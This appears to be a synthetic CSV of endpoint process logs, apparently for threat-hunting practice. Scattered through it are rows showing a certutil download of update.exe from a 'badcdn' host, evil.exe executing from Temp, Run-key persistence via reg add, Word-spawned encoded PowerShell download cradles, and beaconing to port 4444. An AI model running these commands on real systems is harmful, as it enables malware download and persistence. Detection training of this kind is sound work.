timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 23:30:00,ops-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",142.250.183.14,443,outlook
2026-04-01 23:31:00,ops-ws-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 23:32:00,hr-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 23:33:00,fin-ws-02,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 23:34:00,fin-ws-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 23:35:00,ops-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 23:36:00,eng-ws-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 23:37:00,sales-lt-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 23:38:00,sales-lt-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 23:39:00,eng-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 23:40:00,shared-jump-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 23:41:00,fin-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 23:42:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-01 23:43:00,ops-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 23:44:00,shared-jump-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
2026-04-01 23:45:00,eng-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 23:46:00,sales-lt-02,farah,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 23:47:00,sales-lt-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",192.168.10.9,445,none
2026-04-01 23:48:00,ops-ws-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 23:49:00,fin-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 23:50:00,eng-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.0.10,445,none
2026-04-01 23:51:00,hr-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",142.250.183.14,443,outlook
2026-04-01 23:52:00,hr-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 23:53:00,shared-jump-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 23:54:00,fin-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 23:55:00,shared-jump-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 23:56:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",45.33.32.156,443,outlook
2026-04-01 23:57:00,eng-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-01 23:58:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
2026-04-01 23:59:00,hr-ws-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-02 00:00:00,fin-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-02 00:01:00,ops-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-02 00:01:00,shared-jump-01,ethan,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 00:02:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-02 00:02:00,shared-jump-01,ethan,evil.exe,explorer.exe,C:\Users\ethan\AppData\Local\Temp\evil.exe,10.0.0.10,0,none
2026-04-02 00:03:00,fin-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-02 00:03:00,shared-jump-01,ethan,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-02 00:04:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-02 00:05:00,eng-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-02 00:06:00,ops-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.10.9,445,none
2026-04-02 00:07:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-02 00:08:00,eng-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-02 00:09:00,ops-ws-01,diana,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-02 00:10:00,sales-lt-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-02 00:11:00,eng-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",151.101.1.69,443,outlook
2026-04-02 00:12:00,shared-jump-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-02 00:13:00,sales-lt-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",23.45.67.89,443,outlook
2026-04-02 00:14:00,hr-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-02 00:15:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-02 00:16:00,fin-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-02 00:17:00,sales-lt-02,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.5,445,none
2026-04-02 00:18:00,sales-lt-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.1.15,0,none
2026-04-02 00:19:00,shared-jump-01,alice,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-02 00:20:00,shared-jump-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-02 00:21:00,ops-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",151.101.1.69,443,outlook
2026-04-02 00:22:00,hr-ws-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-02 00:23:00,sales-lt-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-02 00:24:00,eng-ws-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",172.16.4.25,0,none
2026-04-02 00:25:00,sales-lt-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-02 00:26:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-02 00:27:00,ops-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.4.25,0,none
2026-04-02 00:28:00,hr-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
2026-04-02 00:29:00,fin-ws-02,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
2026-04-02 00:30:00,eng-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-02 00:31:00,fin-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.1.12,0,none
2026-04-02 00:32:00,hr-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-02 00:33:00,ops-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-02 00:34:00,ops-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",192.168.10.9,0,none
2026-04-02 00:35:00,sales-lt-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-02 00:36:00,fin-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-02 00:37:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-02 00:38:00,sales-lt-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.4.25,0,none
2026-04-02 00:39:00,eng-ws-02,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",45.33.32.156,443,outlook
2026-04-02 00:40:00,hr-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.4.25,445,none
2026-04-02 00:41:00,ops-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-02 00:42:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-02 00:43:00,shared-jump-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-02 00:44:00,sales-lt-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
2026-04-02 00:45:00,ops-ws-02,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-02 00:46:00,eng-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-02 00:47:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
2026-04-02 00:47:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
2026-04-02 00:48:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.0.10,445,none
2026-04-02 00:48:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 00:49:00,sales-lt-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.1.15,0,none
2026-04-02 00:49:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
2026-04-02 00:50:00,ops-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-02 00:51:00,fin-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
2026-04-02 00:52:00,sales-lt-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-02 00:53:00,ops-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-02 00:54:00,ops-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-02 00:55:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
2026-04-02 00:56:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.0.5,0,none
2026-04-02 00:57:00,fin-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-02 00:58:00,hr-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-02 00:59:00,shared-jump-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-02 01:36:00,sales-lt-01,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 01:37:00,sales-lt-01,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 02:11:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-02 02:12:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-02 02:13:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
2026-04-02 03:06:00,sales-lt-01,charlie,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 03:07:00,sales-lt-01,charlie,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 03:55:00,shared-jump-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 03:56:00,shared-jump-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
2026-04-02 03:57:00,shared-jump-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
2026-04-02 04:51:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-02 04:52:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-02 04:53:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
2026-04-02 05:36:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-02 05:37:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-02 05:38:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 06:22:00,sales-lt-02,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 06:23:00,sales-lt-02,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 06:53:00,fin-ws-02,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 06:54:00,fin-ws-02,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,172.16.4.25,0,none
2026-04-02 06:55:00,fin-ws-02,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
2026-04-02 07:27:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 07:28:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 07:52:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 07:53:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 08:47:00,fin-ws-01,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 08:48:00,fin-ws-01,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-02 08:49:00,fin-ws-01,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-02 09:27:00,hr-ws-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 09:28:00,hr-ws-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-02 09:29:00,hr-ws-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.2.20,0,none
2026-04-02 10:27:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 10:28:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 11:07:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-02 11:08:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 11:09:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 12:03:00,ops-ws-01,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 12:04:00,ops-ws-01,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-02 12:05:00,ops-ws-01,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
2026-04-02 12:34:00,ops-ws-02,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 12:35:00,ops-ws-02,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-02 12:36:00,ops-ws-02,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.10.9,0,none
2026-04-02 12:59:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-02 13:00:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 13:01:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-02 13:59:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
2026-04-02 14:00:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-02 14:01:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 14:53:00,sales-lt-02,julia,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 14:54:00,sales-lt-02,julia,evil.exe,explorer.exe,C:\Users\julia\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-02 14:55:00,sales-lt-02,julia,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-02 15:46:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-02 15:47:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 15:48:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
2026-04-02 16:29:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 16:30:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 17:00:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-02 17:01:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-02 17:02:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-02 17:51:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-02 17:52:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-02 17:53:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 18:41:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-02 18:42:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 18:43:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 19:32:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
2026-04-02 19:33:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-02 19:34:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-02 20:29:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-02 20:30:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-02 20:31:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-02 21:29:00,shared-jump-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-02 21:30:00,shared-jump-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-02 21:31:00,shared-jump-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.1.15,0,none
2026-04-02 22:05:00,fin-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 22:06:00,fin-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 22:54:00,shared-jump-01,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 22:55:00,shared-jump-01,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-02 23:39:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-02 23:40:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
